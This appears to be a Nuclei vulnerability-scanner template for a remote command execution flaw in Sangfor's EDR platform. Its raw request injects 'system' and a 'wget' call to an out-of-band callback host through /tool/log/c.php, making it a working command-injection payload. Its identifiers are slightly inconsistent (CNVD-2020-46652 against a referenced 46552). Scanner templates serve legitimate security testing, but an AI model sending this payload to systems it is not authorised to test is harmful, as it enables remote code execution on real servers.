id: CNVD-2020-46652

info:
  name: Sangfor Terminal Monitoring Response Platform (EDR) Remote Command Execution
  author: daffainfo
  severity: critical
  reference:
    - https://blog.csdn.net/PigLL/article/details/108207957
    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-46552
  tags: sangfor,cnvd,cnvd2021,rce

requests:
  - raw:
      - |
        GET /tool/log/c.php?strip_slashes=system&host=wget%20{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"
